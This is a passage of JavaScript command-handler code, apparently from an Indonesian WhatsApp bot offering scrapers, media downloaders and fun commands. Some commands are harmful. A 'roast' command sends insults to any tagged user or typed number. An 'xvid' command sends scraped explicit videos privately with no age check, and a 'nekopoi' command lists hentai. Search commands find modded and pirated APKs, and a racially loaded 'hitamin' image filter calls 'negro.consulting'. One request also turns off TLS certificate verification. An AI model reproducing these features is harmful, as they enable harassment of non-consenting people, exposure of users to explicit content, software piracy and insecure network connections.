        message += `   🔄 *Status:* ${payment.status === 'success' ? '✅ Berhasil' : '⏳ Pending'}\n\n`;
    });
    
    message += `Total donasi: ${db_payments.length}`;
    
    return m.reply(message);
}
break

case 'logout': {
    if (!isOwner) return Reply(mess.owner)
    try {

        fs.writeFileSync("./source/saweria.json", JSON.stringify([], null, 2), 'utf8');
        
        if (global.paymentIntervals) {
            Object.keys(global.paymentIntervals).forEach(key => {
                clearInterval(global.paymentIntervals[key]);
                delete global.paymentIntervals[key];
            });
        }
        
        return m.reply(`Berhasil logout dari Saweria.`);
    } catch (error) {
        console.error('Logout error:', error);
        return m.reply('Terjadi kesalahan saat logout. Silakan coba lagi.');
    }
}
break

case 'hok': case 'honorofkings': {
  if (!q) return m.reply('Contoh: hok agudo');
  const axios = require('axios');
  const cheerio = require('cheerio');

  async function searchHokHeroByName(query) {
    const url = 'https://honor-of-kings.fandom.com/wiki/Heroes';
    const { data } = await axios.get(url, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const $ = cheerio.load(data);
    const heroes = [];
    $('li > a[data-tracking="custom-level-3"]').each((i, el) => {
      const name = $(el).find('span').text().trim();
      const href = $(el).attr('href');
      const fullUrl = `https://honor-of-kings.fandom.com${href}`;
      if (name && name.toLowerCase().includes(query.toLowerCase())) {
        heroes.push({ name, url: fullUrl });
      }
    });

    return heroes;
  }

  async function getHeroDetail(url) {
    const { data } = await axios.get(url, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const $ = cheerio.load(data);
    const details = {};
    $('aside.portable-infobox > section > div.pi-item').each((i, el) => {
      const label = $(el).find('.pi-data-label').text().trim();
      const value = $(el).find('.pi-data-value').text().trim();
      if (label && value) {
        details[label] = value;
      }
    });

    return details;
  }

  try {
    const heroes = await searchHokHeroByName(q);
    if (heroes.length === 0) return m.reply('Hero tidak ditemukan.');
    const hero = heroes[0];
    const detail = await getHeroDetail(hero.url);
    let teks = `*${hero.name}*\n${hero.url}\n\n`;
    for (let [key, value] of Object.entries(detail)) {
      teks += `*${key}:* ${value}\n`;
    }
    m.reply(teks);
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat mengambil data.');
  }
}
break
case 'telegraph':
case 'telegra': {
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  if (!mime) return m.reply('Balas gambar dengan caption .telegraph atau kirim gambar dengan caption .telegraph'); 
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply('Hanya mendukung format gambar JPG dan PNG');
  let img = await quoted.download();
  const tempFile = `./tmp/${Math.random().toString(36).substring(2)}.jpg`;
  fs.writeFileSync(tempFile, img);
  try {
    const FormData = require('form-data');
    const axios = require('axios');
    let d = new FormData();
    d.append("images", fs.createReadStream(tempFile));
    let h = {
      headers: {
        ...d.getHeaders()
      }
    }
    let { data: uploads } = await axios.post("https://telegraph.zorner.men/upload", d, h);
    if (uploads && uploads.links && uploads.links.length > 0) {
      const yatta = `${uploads.links[0]}`;
      m.reply(yatta);
    } else {
      m.reply('Gagal upload');
    }
    fs.unlinkSync(tempFile);
  } catch (e) {
    m.reply(`Error: ${e.message}`);
    if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
  }
}
break

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break
case 'liputan': case 'liputannews':
    try {
   const axios = require('axios');
 const res = await axios.get('https://liputannews.id', {
 headers: {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
 }
 });
     const cheerio = require('cheerio');
     const $ = cheerio.load(res.data);
 let result = [];
 $('.post.type-post.hentry').each((_, elketek) => {
      const title = $(elketek).find('p').text().trim();
      const description = $(elketek).find('h2').text().trim();
      const thumbnail = $(elketek).find('img').attr('src');
      const link = $(elketek).find('a').attr('href');
      const author = $(elketek).find('a.url.fn.n').text().trim();
      const post = $(elketek).find('span.cat-links-content').text().trim();
      const time = $(elketek).find('span.posted-on').text().trim();
 result.push({ title, description, thumbnail, link, author, post, time });
 });
    let teks = '*Berita Terbaru dari LiputanNews:*\n\n';
 result.slice(0, 5).forEach((item, i) => {
 teks += `*${i + 1}. ${item.description}*\n${item.link}\n\n`;
 });
     m.reply(teks);
 } catch (err) {
 m.reply('Gagal mengambil berita: ' + err.message);
 }
 break
case "randomhadist":
  {
    fetch("https://api.crafters.biz.id/random/hadits")
      .then((res) => res.json())
      .then((data) => {
        if (!data.status) return conn.sendMessage(m.chat, { text: "Gagal mengambil hadits!" }, { quoted: m });
        let teks = `📖 *Hadits Random*\n\n📌 *Nomor:* ${data.result.nomor}\n📜 *Judul:* ${data.result.judul}\n\n📖 *Teks Arab:*\n${data.result.teks_arab}\n\n🌍 *Terjemahan:*\n${data.result.terjemahan}`;
        conn.sendMessage(m.chat, { text: teks }, { quoted: m });
      })
      .catch(() => conn.sendMessage(m.chat, { text: "Terjadi kesalahan!" }, { quoted: m }));
  }
  break
  
case 'materialgi': case 'mategi': case 'materialgenshin': {
  if (!text) return m.reply('Masukkan nama material! Contoh: .materialgi silk flower')

  try {
    const res = await fetch(`https://genshin-db-api.vercel.app/api/v5/materials?query=${encodeURIComponent(text)}&dumpResult=true&resultLanguage=Indonesian`)
    const json = await res.json()
    if (!json || !json.result) return m.reply('Material tidak ditemukan.')
    const mat = json.result
    const caption = `
*${mat.name}* ${mat.rarity ? `(${mat.rarity}★)` : ''}
Kategori: ${mat.category || '-'}
Tipe: ${mat.typeText || '-'}
Versi: ${mat.version || '-'}

*Deskripsi:*
${mat.description}

*Sumber:*
${mat.sources?.map(s => `- ${s}`).join('\n') || '-'}
`.trim()
    m.reply(caption)
  } catch (e) {
    console.error(e)
    m.reply(`Terjadi kesalahan saat mengambil data material\n\n${e}`)
  }
}
break

case 'roast':
case 'roasting': {
  let orang = m.mentionedJid && m.mentionedJid[0]
    ? m.mentionedJid[0]
    : text
    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    : null;
  if (!orang) return m.reply('Tag orang atau ketik nomornya, contoh: *.roast @user* atau *.roast 628xxxx*');
  let ppthumb;
  try {
    ppthumb = await conn.profilePictureUrl(orang, 'image');
  } catch {
    ppthumb = global.image.menu;
  }
  const roastList = [
    `@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`,
    `@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`,
    `@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori "rusak parah, dijual kiloan".`,
    `@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`,
    `@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`,
    `@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`,
    `@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`,
    `@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`,
    `@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`,
    `@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`,
    `@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`,
    `@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`,
    `@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`,
    `@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`,
    `@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`,
    `@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`,
    `@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`,
    `@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`,
    `@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`,
    `@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`,
    `@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`,
    `@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`,
    `@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diingat, tapi udah gak guna.`,
    `@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`,
    `@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`,
    `@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`,
    `@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`,
    `@user, kalau lu jadi sinetron, pasti judulnya *“Anak Durhaka Gagal Update Otak.”*`,
    `@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`,
    `@user, otak lu kayak server gratis—down terus tiap dibutuhin.`,
    `@user, kalo jadi emoji, lu tuh pasti "buffering".`,
    `@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`,
    `@user, tiap kali lu ngomong, grammar dunia ikut menangis.`,
    `@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`,
    `@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`
  ];
  const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
  try {
    await conn.sendMessage(orang, {
      text: roastText,
      mentions: [orang],
      contextInfo: {
        externalAdReply: {
          title: `${botname} - ${versi} ⚙️`,
          body: `⏱ Runtime: ${runtime(process.uptime())}`,
          thumbnailUrl: ppthumb,
          sourceUrl: global.linkSaluran
        }
      }
    });
  } catch (error) {
    console.error("Error saat mengirim pesan:", error);
    m.reply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
  }
}
break

case "xvid": case "xxx": case "xvideo": {
    m.reply(`Hello, video akan dikirim secara private hehe~`);
    try {
const axios = require('axios');
const cheerio = require('cheerio');
        let page = Math.floor(Math.random() * 1153);
        let { data } = await axios.get(`https://sfmcompile.club/page/${page}`);
        let $ = cheerio.load(data);
        let hasil = [];
        $('#primary > div > div > ul > li > article').each((_, b) => {
            let title = $(b).find('header > h2').text().trim();
            let link = $(b).find('header > h2 > a').attr('href');
            let category = $(b).find('header > div.entry-before-title > span > span').text().replace('in ', '').trim();
            let share_count = $(b).find('header > div.entry-after-title > p > span.entry-shares').text().trim();
            let views_count = $(b).find('header > div.entry-after-title > p > span.entry-views').text().trim();
            let type = $(b).find('source').attr('type') || 'image/jpeg';
            let video_1 = $(b).find('source').attr('src') || $(b).find('img').attr('data-src');
            if (video_1) {
                hasil.push({ title, link, category, share_count, views_count, type, video_1 });
            }
        });
        if (!hasil.length) {
            return m.reply(`Maaf, tidak dapat menemukan video.`);
        }
        let tan = hasil[Math.floor(Math.random() * hasil.length)];
        let caption = `
⭔ *Title* : ${tan.title}
⭔ *Category* : ${tan.category}
⭔ *Mimetype* : ${tan.type}
⭔ *Views* : ${tan.views_count}
⭔ *Shares* : ${tan.share_count}
⭔ *Source* : ${tan.link}
⭔ *Media Url* : ${tan.video_1}
`;
        await conn.sendMessage(m.sender, { video: { url: tan.video_1 }, caption }, { quoted: m });
    } catch (error) {
        console.error("Error fetching video:", error);
        m.reply("Terjadi kesalahan saat mengambil video.");
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "freebox":
case "buatgambar":
case "prompttoimg":
case "ttg": {
  if (!text.includes(",")) {
    return m.reply(`Format salah!\n\nContoh:\ngenerateimg 9:16, a man in the shadow

List rasio yang didukung:
• 1:1 (Square)
• 9:16 (Portrait / Story)
• 16:9 (Landscape)
• 4:3 (Standard)
• 3:4 (Vertical Standard)`);
  }
  const [ratioRaw, ...promptParts] = text.split(",");
  const ratio = ratioRaw.trim();
  const prompt = promptParts.join(",").trim();
  const axios = require("axios");
  if (!ratio || !prompt) {
    return m.reply("Pastikan kamu memasukkan rasio dan prompt dengan benar.\nContoh: generateimg 1:1, kucing lucu");
  }

  const supportedRatios = ["1:1", "9:16", "16:9", "4:3", "3:4"];
  if (!supportedRatios.includes(ratio)) {
    return m.reply(`Rasio *${ratio}* tidak didukung.\n\nGunakan salah satu dari:\n• 1:1\n• 9:16\n• 16:9\n• 4:3\n• 3:4`);
  }
  const base = { api: "https://aifreebox.com/api/image-generator" };
  try {
    const payload = {
      aspectRatio: ratio,
      slug: "ai-photo-generator",
      userPrompt: prompt
    };

    const { data: result } = await axios.post(base.api, payload);
    if (result.status == "400") {
      m.reply("Konten NSFW berhasil terdeteksi!");
    } else {
      if (result.imageUrl) {
        conn.sendMessage(m.chat, { image: { url: result.imageUrl }, caption: "Berhasil digenerate!" }, { quoted: m });
      } else {
        m.reply("Gagal mendapatkan gambar.");
      }
    }
  } catch (err) {
    console.error(err);
    m.reply("Terjadi kesalahan saat memproses gambar.");
  }
}
  break
  case 'mod': {
  const [command, ...rest] = q.split(' ');
  const text = rest.join(' ');

  if (!command) return m.reply('Contoh:\n- mod search whatsapp\n- mod detail <link>');

  if (command === 'search') {
    if (!text) return m.reply('Masukkan kata kunci pencarian!\nContoh: mod search whatsapp');
    try {
const axios = require('axios');
const cheerio = require('cheerio');
      const res = await axios.get(`https://modded-by-yadi.blogspot.com/search?q=${text}`);
      const $ = cheerio.load(res.data);
      let teks = '*Hasil Pencarian:*\n\n';

      $('article.post.post-wrapper').each((i, el) => {
        const title = $(el).find('h2.post-title.entry-title a').text().trim();
        const link = $(el).find('h2.post-title.entry-title a').attr('href');
        const img = $(el).find('img.post-thumbnail').attr('src');
        const date = $(el).find('abbr.published.updated').attr('title');
        teks += `*${title}*\n📆 ${date}\n🔗 ${link}\n\n`;
      });

      if (!teks.includes('🔗')) return m.reply('Tidak ada hasil ditemukan!');
      m.reply(teks);
    } catch (e) {
      console.error(e);
      m.reply('Gagal mengambil data.');
    }
  } else if (command === 'detail') {
    if (!text) return m.reply('Masukkan link detail dari hasil pencarian!\nContoh: mod detail https://modded-by-yadi.blogspot.com/...');
    try {
const axios = require('axios');
const cheerio = require('cheerio');
      const res = await axios.get(text);
      const $ = cheerio.load(res.data);
      let appInfo = {
        Thumbnail: $('table img').attr('src') || '-',
        NamaApp: '-',
        Versi: '-',
        Developer: { Nama: '-', Link: '-' },
        ArmDevice: { SupportedArchitecture: '-', MinimalAndroid: '-' },
        NamaPaket: { ID: '-', PlayStoreLink: '-' },
        DeskripsiApp: '-',
        DownloadLinks: { MediaFire: '-', GoogleDrive: '-' }
      };

      $('table').each((_, table) => {
        $(table).find('tr').each((__, row) => {
          const header = $(row).find('td').eq(0).text().trim();
          const value = $(row).find('td').eq(1).text().trim();
          const link = $(row).find('a').attr('href');
          if (header === 'Nama App') appInfo.NamaApp = value;
          if (header === 'Versi') appInfo.Versi = value;
          if (header === 'Developer') {
            appInfo.Developer.Nama = value;
            appInfo.Developer.Link = link;
          }
          if (header === 'Arm / Device') {
            const [arch, android] = value.split('Minimal Android');
            appInfo.ArmDevice.SupportedArchitecture = arch?.trim() || '-';
            appInfo.ArmDevice.MinimalAndroid = android?.trim() || '-';
          }
          if (header === 'Nama Paket') {
            appInfo.NamaPaket.ID = value;
            appInfo.NamaPaket.PlayStoreLink = link;
          }
        });
      });

      $('#hidedesc td p').each((_, el) => {
        const desc = $(el).text().trim();
        if (desc) appInfo.DeskripsiApp = desc;
      });

      $('a').each((_, el) => {
        const href = $(el).attr('href');
        if (href?.includes('mediafire.com')) appInfo.DownloadLinks.MediaFire = href;
        if (href?.includes('drive.google.com')) appInfo.DownloadLinks.GoogleDrive = href;
      });

      let teks = `*${appInfo.NamaApp} v${appInfo.Versi}*\n\n`;
      teks += `📦 Package: ${appInfo.NamaPaket.ID}\n`;
      teks += `🧑‍💻 Developer: ${appInfo.Developer.Nama}\n`;
      teks += `🔗 Developer Link: ${appInfo.Developer.Link}\n`;
      teks += `📱 Arch: ${appInfo.ArmDevice.SupportedArchitecture}\n`;
      teks += `📱 Min Android: ${appInfo.ArmDevice.MinimalAndroid}\n`;
      teks += `\n📜 Deskripsi:\n${appInfo.DeskripsiApp}\n`;
      teks += `\n🔗 MediaFire: ${appInfo.DownloadLinks.MediaFire}\n`;
      teks += `🔗 Google Drive: ${appInfo.DownloadLinks.GoogleDrive}`;

      if (appInfo.Thumbnail && appInfo.Thumbnail !== '-') {
        conn.sendMessage(m.chat, { image: { url: appInfo.Thumbnail }, caption: teks }, { quoted: m });
      } else {
        m.reply(teks);
      }
    } catch (e) {
      console.error(e);
      m.reply('Gagal mengambil detail aplikasi.');
    }
  } else {
    m.reply('Perintah tidak dikenali!\nContoh:\n- mod search whatsapp\n- mod detail <link>');
  }
}
break
  case "hitamin": {
  if (!/image/.test(mime)) return m.reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");
  const mediaPath = await conn.downloadAndSaveMediaMessage(qmsg);
  const buffer = fs.readFileSync(mediaPath);
  const base64Image = buffer.toString("base64");
  try {
const axios = require('axios');
    const response = await axios({
      url: "https://negro.consulting/api/process-image",
      method: "POST",
      data: {
        filter: "hitam",
        imageData: "data:image/png;base64," + base64Image
      }
    });

    const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
    await conn.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.log(err);
    m.reply("Gagal memproses gambar.");
  }
}
break
  case 'countjam': {
  if (!q) return m.reply('Contoh: countjam 06:35');
  const moment = require('moment-timezone');
  const [jamTarget, menitTarget] = q.split(':').map(x => parseInt(x));
  if (isNaN(jamTarget) || isNaN(menitTarget))
    return m.reply('Format jam salah. Contoh: 06:35');
  let now = moment().tz('Asia/Jakarta');
  let target = moment().tz('Asia/Jakarta').hour(jamTarget).minute(menitTarget).second(0);
  if (target.isBefore(now)) target.add(1, 'day');
  let diff = target.diff(now, 'seconds');
  if (diff <= 0) return m.reply('Waktu target sudah lewat.');
  function formatTime(sec) {
    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
    const s = String(sec % 60).padStart(2, '0');
    return `${h}:${m}:${s}`;
  }
  const teksAwal = `⏳ *Countdown dimulai!*\nMenuju jam *${q} WIB*`;
  let sent = await conn.sendMessage(m.chat, { text: `${teksAwal}\n\nSisa waktu: *${formatTime(diff)}*` }, { quoted: m });

  let interval = setInterval(async () => {
    diff--;
    if (diff <= 0) {
      clearInterval(interval);
      return await conn.sendMessage(m.chat, {
        edit: sent.key,
        text: `✅ *Waktu ${q} WIB telah tiba!*\nSemoga kamu nggak telat ya!`
      });
    }
    await conn.sendMessage(m.chat, {
      edit: sent.key,
      text: `${teksAwal}\n\nSisa waktu: *${formatTime(diff)}*`
    });
  }, 1000);
}
break
case "apkmod": {
if (!text) return m.reply(example("capcut"))
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'igdl2': case 'ig2':
case 'instagram2':
  if (!text) return m.reply("Masukkan URL Instagram!\nContoh: igdl2 https://www.instagram.com/p/xxx");

  try {
    const axios = require("axios");
    const cheerio = require("cheerio");
    const igdl = async (u) => {
      let { data } = await axios.get(
        `https://snapdownloader.com/tools/instagram-downloader/download?url=${u}`
      );
      let $ = cheerio.load(data);
      const result = [];
      $(".download-item").each((i, el) => {
        const type = $(el).find(".type").text().trim().toLowerCase();
        const url = $(el).find(".btn-download").attr("href");
        if (url) result.push({ type, url });
      });
      return result;
    };
    await conn.sendMessage(m.chat, {
      react: {
        text: "⏳",
        key: m.key
      }
    });
    const res = await igdl(text);
    if (!res.length) return m.reply("Gagal mengambil media.");
    let linkList = res.map((v, i) => `${i + 1}. [${v.type}] ${v.url}`).join('\n');
    let caption = `Berikut media yang berhasil diunduh:\n\n${linkList}`;
    for (let i = 0; i < res.length; i++) {
      let media = res[i];
      if (media.type === "video") {
        await conn.sendMessage(m.chat, {
          video: { url: media.url },
          caption
        }, { quoted: m });
      } else if (media.type === "photo" || media.type === "image") {
        await conn.sendMessage(m.chat, {
          image: { url: media.url },
          caption
        }, { quoted: m });
      }
    }
    await conn.sendMessage(m.chat, {
      react: {
        text: "✔️",
        key: m.key
      }
    });
  } catch (e) {
    m.reply("Gagal mengunduh media Instagram!\n\n" + e.message);
  }
  break
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!argsbiyuoffc[0]) return m.reply("🔗 Masukkan URL Facebook atau Instagram!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("Gagal mengambil data.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("Tidak ada media yang dapat diunduh.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media tidak ditemukan.");
 }
 } else {
 throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await conn.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(argsbiyuoffc[0]);
 if (res.error) {
 await conn.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await conn.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await conn.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
 } else if (res.type === "image") {
 await conn.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await conn.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Berhasil mengunduh gambar!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await conn.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("Terjadi kesalahan saat mengambil media.");
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

case "saanvi":
  {
    if (!text) return m.reply("Masukkan teks yang mau ditanya ke Saanvi.");
    fetch(`https://api.crafters.biz.id/ai/saanvi?text=${encodeURIComponent(text)}`)
      .then(res => res.json())
      .then(data => m.reply(data?.result?.result || "Gagal mendapatkan respon."))
      .catch(() => m.reply("Terjadi kesalahan saat menghubungi API Saanvi."));
  }
  break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "neko": case "nekopoi": {
  try {
    const fetch = require('node-fetch');
    const https = require('https');
    
    const agent = new https.Agent({
      rejectUnauthorized: false 
    });

    let anu = `https://archive-ui.tanakadomp.biz.id/asupan/nekopoi`;
    const res = await fetch(anu, { agent });
    const data = await res.json();
    
    if (!data.status) return m.reply("Gagal mendapatkan data!");
    
    let hasil = `*Hasil Pencarian*\n\n`;
    const maxResults = Math.min(15, data.result.length);
    
    for (let i = 0; i < maxResults; i++) {
      hasil += `📍 *Title:* ${data.result[i].title}\n`;
      hasil += `📅 *Upload:* ${data.result[i].upload}\n`;
      hasil += `🔗 *URL:* ${data.result[i].URL}\n\n`;
      hasil += `───────────────────\n\n`;
    }
    
    m.reply(hasil);
  } catch (e) {
    console.error('Error:', e);
    m.reply("Terjadi kesalahan saat mengambil data! " + e.message);
  }
}
break

case 'ckalender': case 'createkalender': {
    let argsbiyuS = text.split(' ');
    if (argsbiyuS.length < 2) return m.reply('Format salah! Gunakan: ckalender bulan tahun');
    let month = argsbiyuS[0];
    let year = argsbiyuS[1];
    if (isNaN(month) || isNaN(year)) return m.reply('Bulan dan tahun harus berupa angka!');
    let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
    conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `Kalender bulan ${month} tahun ${year}` }, { quoted: m });
    }
    break
    
case "scdl": case "songdown":
case "downsong": {
 if (!text) return m.reply(`Example: ${prefix + command} url`);
 
 m.reply('Tunggu sebentar kak...');
 
 try {
 let api = await fetch(`https://rest.cloudkuimages.xyz/api/download/soundcloud?url=${text}`);
 let data = await api.json();
 
 if (!data.status) return m.reply('Download failed! Try again later.');
 
 let caption = `乂 *SOUNDCLOUD DOWNLOADER* ◦\n\n`;
 caption += `乂 *Status* : ${data.status}\n`;
 caption += `乂 *Creator* : ${data.creator}\n`;
 caption += `乂 *Title* : ${data.result.title}\n`;
 caption += `乂 *Thumbnail* : ${data.result.image}\n`;
 caption += `乂 *Download* : ${data.result.download}\n`;
 
 await conn.sendMessage(m.chat, { image: { url: data.result.image }, caption: caption });
 await conn.sendMessage(m.chat, { audio: { url: data.result.download }, mimetype: "audio/mpeg" });
 } catch (e) {
 console.log(e);
 m.reply('Error occurred while downloading!');
 }
}
break
case 'infogc':
case 'infogroup': {
  const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i
  const code = argsbiyuoffc[0]?.match(regex)?.[1]
  if (code) {
    try {
      const info = await conn.groupGetInviteInfo(code)
      const groupPP = info.groupPicture || 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
      const adminCount = info.participants?.filter(p => p.admin !== null).length || 'Tidak diketahui'
      const creationDate = info.creation ? new Date(info.creation * 1000).toLocaleString('id-ID') : 'Tidak diketahui'
      let creator = 'Tidak diketahui'
      if (info.owner) {
        creator = info.owner.split('@')[0] 
      } else {
        const creatorData = info.participants?.find(p => p.admin === 'creator')
        if (creatorData) creator = creatorData.id.split('@')[0]
      }
      const caption = `*INFO GRUP (via Link):*\n\n` +
                      `*Nama:* ${info.subject}\n` +
                      `*Deskripsi:* ${info.desc || 'Tidak ada deskripsi.'}\n` +
                      `*Tanggal Dibuat:* ${creationDate}\n` +
                      `*Dibuat Oleh:* ${creator}\n` +
                      `*Total Member:* ${info.size || 'Tidak diketahui'}\n` +
                      `*Jumlah Admin:* ${adminCount}`
      conn.sendMessage(m.chat, {
        image: { url: groupPP },
        caption
      }, { quoted: m })
    } catch (e) {
      console.error(e)
      return m.reply('Gagal ambil info dari link. Link-nya valid? Bot mungkin tidak punya akses.')
    }
    return
  }

  if (!m.isGroup) return m.reply('Command ini hanya bisa digunakan di grup atau dengan link grup.')

  try {
    const metadata = await conn.groupMetadata(m.chat)
    const groupPP = await conn.profilePictureUrl(m.chat, 'image').catch(() =>
      'https://telegra.ph/file/265c672094dfa87caea19.jpg'
    )
    const adminCount = metadata.participants.filter(p => p.admin !== null).length
    const creationDate = metadata.creation ? new Date(metadata.creation * 1000).toLocaleString('id-ID') : 'Tidak diketahui'
    let creator = 'Tidak diketahui'
    if (metadata.owner) {
      creator = metadata.owner.split('@')[0]
    } else {
      const creatorData = metadata.participants.find(p => p.admin === 'creator')
      if (creatorData) creator = creatorData.id.split('@')[0]
    }
    const caption = `*INFO GRUP:*\n\n` +
                    `*Nama:* ${metadata.subject}\n` +
                    `*Deskripsi:* ${metadata.desc || 'Tidak ada deskripsi.'}\n` +
                    `*Tanggal Dibuat:* ${creationDate}\n` +
                    `*Dibuat Oleh:* ${creator}\n` +
